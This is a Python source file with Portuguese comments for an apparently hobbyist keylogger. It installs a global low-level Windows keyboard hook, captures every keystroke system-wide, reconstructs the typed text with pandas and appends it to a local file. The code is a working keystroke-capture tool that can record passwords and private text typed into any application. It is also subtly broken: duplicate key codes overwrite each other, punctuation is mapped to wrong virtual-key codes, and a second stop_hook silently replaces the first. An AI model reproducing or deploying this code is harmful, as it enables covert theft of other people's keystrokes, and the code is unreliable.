import ctypes
from ctypes import wintypes, POINTER, Structure
from time import sleep
import threading
from enum import Enum

import numpy as np
import pandas as pd

# Definição de variáveis e tipos específicos do ctypes para manipulação de dados em C.
LPDWORD = POINTER(wintypes.DWORD)  # Ponteiro para DWORD (32 bits).
ULONG_PTR = wintypes.ULONG         # Representa um ponteiro de 32 ou 64 bits.

# Carrega as DLLs do Windows para utilizar funções de baixo nível.
kernel32 = ctypes.WinDLL("kernel32")  # Acesso a funções de kernel do Windows.
user32 = ctypes.WinDLL("user32", use_last_error=True)  # Acesso a funções da interface de usuário.

# Estrutura KBDLLHOOKSTRUCT utilizada para capturar informações detalhadas sobre eventos de teclado.
class KBDLLHOOKSTRUCT(Structure):
    _fields_ = [
        ("vkCode", wintypes.DWORD),  # Código virtual da tecla pressionada.
        ("scanCode", wintypes.DWORD),  # Código de varredura do teclado.
        ("flags", wintypes.DWORD),  # Flags associadas ao evento.
        ("time", wintypes.DWORD),  # Tempo em milissegundos desde o início do sistema.
        ("dwExtraInfo", ULONG_PTR),  # Informações adicionais (geralmente não usadas).
    ]

# Dict from https://pypi.org/project/keyboard/
# Editado para melhor compatibilidade.

# Dicionário que mapeia os códigos de eventos para os tipos de eventos de teclado.
events = {
    0x100: "KEY_DOWN",     # Pressionamento de uma tecla.
    0x101: "KEY_UP",       # Liberação de uma tecla.
    0x104: "KEY_DOWN_SYS", # Pressionamento de uma tecla do sistema (Alt + tecla).
    0x105: "KEY_UP_SYS",   # Liberação de uma tecla do sistema.
}

# Dicionário que mapeia códigos virtuais de teclas para seus nomes e se são numéricas.
VK_CODELETTER = {
    0x08: ("backspace", False),
    0x09: ("tab", False),
    0x0D: ("enter", False),
    0x10: ("shift", False),      # Shift (genérico)
    0xA0: ("left_shift", False), # Left Shift
    0xA1: ("right_shift", False),# Right Shift
    0x11: ("ctrl", False),       # Ctrl (genérico)
    0xA2: ("left_ctrl", False),  # Left Ctrl
    0xA3: ("right_ctrl", False), # Right Ctrl
    0x12: ("alt", False),        # Alt (genérico)
    0xA4: ("left_alt", False),   # Left Alt
    0xA5: ("right_alt", False),  # Right Alt
    0x20: ("spacebar", False),
    0x25: ("left", False),
    0x26: ("up", False),
    0x27: ("right", False),
    0x28: ("down", False),
    0x30: ("0", False),
    0x31: ("1", False),
    0x32: ("2", False),
    0x33: ("3", False),
    0x34: ("4", False),
    0x35: ("5", False),
    0x36: ("6", False),
    0x37: ("7", False),
    0x38: ("8", False),
    0x39: ("9", False),
    0x41: ("a", False),
    0x42: ("b", False),
    0x43: ("c", False),
    0x44: ("d", False),
    0x45: ("e", False),
    0x46: ("f", False),
    0x47: ("g", False),
    0x48: ("h", False),
    0x49: ("i", False),
    0x4A: ("j", False),
    0x4B: ("k", False),
    0x4C: ("l", False),
    0x4D: ("m", False),
    0x4E: ("n", False),
    0x4F: ("o", False),
    0x50: ("p", False),
    0x51: ("q", False),
    0x52: ("r", False),
    0x53: ("s", False),
    0x54: ("t", False),
    0x55: ("u", False),
    0x56: ("v", False),
    0x57: ("w", False),
    0x58: ("x", False),
    0x59: ("y", False),
    0x5A: ("z", False),
    0xC1: ("á", False),  # á (a com acento agudo)
    0xC9: ("é", False),  # é (e com acento agudo)
    0xCD: ("í", False),  # í (i com acento agudo)
    0xD3: ("ó", False),  # ó (o com acento agudo)
    0xDA: ("ú", False),  # ú (u com acento agudo)
    0xE0: ("à", False),  # à (a com acento grave)
    0xE8: ("è", False),  # è (e com acento grave)
    0xEC: ("ì", False),  # ì (i com acento grave)
    0xF2: ("ò", False),  # ò (o com acento grave)
    0xF9: ("ù", False),  # ù (u com acento grave)
    0xE3: ("ã", False),  # ã (a com til)
    0xF5: ("õ", False),  # õ (o com til)
    0xE2: ("â", False),  # â (a com circunflexo)
    0xEA: ("ê", False),  # ê (e com circunflexo)
    0xEE: ("î", False),  # î (i com circunflexo)
    0xF4: ("ô", False),  # ô (o com circunflexo)
    0xFB: ("û", False),  # û (u com circunflexo)
    0xE7: ("ç", False),  # ç (c cedilha)
    0x2C: (",", False),  # Vírgula
    0x2E: (".", False),      # Ponto final
    0x3B: (";", False),      # Ponto-e-vírgula
    0x3A: (":", False),      # Dois pontos
    0x3F: ("?", False),      # Interrogação
    0x21: ("!", False),      # Exclamação
    0x2D: ("-", False),      # Hífen
    0x5F: ("_", False),      # Underscore
    0x28: ("(", False),      # Parêntese esquerdo
    0x29: (")", False),      # Parêntese direito
    0x22: ("\"", False),    # Aspas duplas
    0x27: ("'", False),      # Aspas simples
    0x2F: ("/", False),      # Barra
    0x5C: ("\\", False),   # Barra invertida
    0x7C: ("|", False),      # Pipe
    0x3C: ("<", False),      # Menor que
    0x3E: (">", False),      # Maior que
    0x5B: ("[", False),      # Colchete esquerdo
    0x5D: ("]", False),      # Colchete direito
    0x7B: ("{", False),      # Chave esquerda
    0x7D: ("}", False),      # Chave direita
    0x5E: ("^", False),      # Circunflexo
    0x60: ("`", False),      # Acento grave
    0x7E: ("~", False),      # Til
    0xB4: ("´", False),      # Acento agudo
    0x70: ("f1", False),
    0x71: ("f2", False),
    0x72: ("f3", False),
    0x73: ("f4", False),
    0x74: ("f5", False),
    0x75: ("f6", False),
    0x76: ("f7", False),
    0x77: ("f8", False),
    0x78: ("f9", False),
    0x79: ("f10", False),
    0x7A: ("f11", False),
    0x7B: ("f12", False),
}



# Classe responsável por gerenciar o hook de teclado.
class KeyboardHookManager:
    def __init__(self):
        # Inicializa variáveis para o hook e resultados capturados.
        self.hook_id = None
        self.done = False  # Indica quando o hook deve ser encerrado.
        self.results = []  # Lista para armazenar os eventos capturados.

    # Função que processa eventos de teclado.
    def hook_proc(self, nCode, wParam, lParam):
        if nCode >= 0:  # Verifica se o evento deve ser processado.
            # Obtém os dados do evento de teclado.
            kb_struct = ctypes.cast(lParam, POINTER(KBDLLHOOKSTRUCT)).contents
            event_type = events.get(wParam, "UNKNOWN")  # Tipo do evento (KEY_DOWN, KEY_UP, etc.).
            key_info = VK_CODELETTER.get(kb_struct.vkCode, (f"Unknown ({kb_struct.vkCode})", False))

            # Armazena os detalhes do evento capturado.
            self.results.append(
                {
                    "event": event_type,
                    "key": key_info[0],  # Nome da tecla.
                    "is_numeric": key_info[1],  # Se a tecla é numérica.
                    "scanCode": kb_struct.scanCode,  # Código de varredura.
                    "flags": kb_struct.flags,  # Flags do evento.
                    "time": kb_struct.time,  # Tempo do evento.
                }
            )
            print(self.results[-1])  # Exibe o evento capturado no console.

        # Continua a cadeia de hooks chamando o próximo hook.
        return user32.CallNextHookEx(None, ctypes.c_int(nCode), ctypes.c_int(wParam), ctypes.c_void_p(lParam))

    # Função para iniciar o hook.
    def start_hook(self):
        def hook_thread():
            # Define o protótipo do callback para o hook de teclado.
            HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_int, wintypes.INT, wintypes.WPARAM, wintypes.LPARAM)
            hook_func = HOOKPROC(
                self.hook_proc)  # Associa o método `hook_proc` como callback para os eventos do teclado.

            # Configura o hook de teclado (WH_KEYBOARD_LL = 13).
            self.hook_id = user32.SetWindowsHookExW(13, hook_func, None, 0)
            if not self.hook_id:
                raise RuntimeError("Failed to set hook")  # Lança um erro se o hook não puder ser configurado.

            # Obtém o ID da thread atual e o armazena. Isso é necessário para enviar mensagens para esta thread posteriormente.
            self.thread_id = kernel32.GetCurrentThreadId()

            # Estrutura usada para capturar mensagens no loop de mensagens.
            msg = wintypes.MSG()

            # Loop para processar as mensagens enquanto o hook está ativo.
            while not self.done:
                # `PeekMessageW` verifica se há mensagens pendentes na fila sem bloquear a execução.
                # O último argumento (1) instrui o método a remover mensagens da fila.
                user32.PeekMessageW(ctypes.byref(msg), None, 0, 0, 1)

            # Quando `self.done` é definido como True, o loop é encerrado, e o hook é removido.
            user32.UnhookWindowsHookEx(self.hook_id)

        # Inicia o hook em uma nova thread para evitar bloquear o programa principal.
        threading.Thread(target=hook_thread, daemon=True).start()

    def stop_hook(self):
        # Define `self.done` como True, sinalizando para o loop de mensagens na thread de hook que ele deve encerrar.
        self.done = True

        # Envia uma mensagem do tipo WM_QUIT (0x0012) para a thread de hook.
        # Isso força o loop de mensagens a encerrar, mesmo que ele ainda esteja esperando eventos.
        kernel32.PostThreadMessageW(self.thread_id, 0x0012, 0, 0)

    # Função para encerrar o hook.
    def stop_hook(self):
        self.done = True  # Sinaliza para encerrar o loop de mensagens.

# Código principal para executar o exemplo.
if __name__ == "__main__":
    manager = KeyboardHookManager()  # Cria uma instância do gerenciador de hooks.
    manager.start_hook()  # Inicia o hook.

    print("Pressione qualquer tecla. Digite 'exit' para encerrar.")
    try:
        while not manager.done:  # Loop para capturar entrada do usuário.
            user_input = input()  # Aguarda o usuário digitar algo.
            if user_input.lower() == "exit":  # Se digitar "exit", encerra o hook.
                manager.stop_hook()

        # Processamento dos dados capturados com pandas.
        df = pd.DataFrame(manager.results)

        # Valida se o DataFrame não está vazio antes de prosseguir.
        if not df.empty:
            # Filtra eventos de teclas pressionadas (KEY_DOWN).
            df = df.loc[df['event'] == 'KEY_DOWN'].reset_index(drop=True)

            # Identifica e trata as teclas shift para letras maiúsculas.
            shiftkeys = df.loc[df['key'].str.contains('shift', regex=True, na=False)].index
            valid_indices = shiftkeys[shiftkeys + 1 < len(df)] + 1
            df.loc[valid_indices, 'key'] = df.loc[valid_indices, 'key'].str.upper()

            # Remove eventos de backspace e ajusta o DataFrame.
            backspace_keys = df.loc[df['key'].str.contains('backspace', regex=True, na=False)].index
            gone_keys = backspace_keys - 1
            df = df.drop(np.concatenate([backspace_keys, gone_keys])).reset_index(drop=True)

            # Adiciona o espaço quando apertado.
            # Localizar as linhas que contêm "spacebar".
            spacebar_keys = df.loc[df['key'].str.contains('spacebar', regex=True, na=False)].index

            # Adicionar espaços nos índices válidos após "spacebar".
            for idx in spacebar_keys:
                if idx + 1 < len(df):
                    df.loc[idx, 'key'] = ' '  # Substitui o "spacebar" por espaço.
                else:
                    df = pd.concat([df, pd.DataFrame({'key': [' ']})], ignore_index=True)  # Adiciona espaço ao final

            # Gera a frase final.
            frase = ''.join(df['key'].to_list())

            # Salva a frase em um arquivo.
            output = 'C:\\Users\\Bryan\\Desktop\\Programação\\Python\\kl_teste\\test_keylogger'
            with open(output, mode='a', encoding='utf8') as f:
                f.write(f'{frase}\n')

            # Simulando o processamento do input de teclado
            print(frase)


    except KeyboardInterrupt:  # Captura interrupção pelo teclado (Ctrl+C).
        manager.stop_hook()

# Corrigir maneira de saída (provavelmente remete ao index), investigar a possibilidade de adicionar a role "special" ao VKdict, visando facilitar a remoção de letras ecpeciais do texto.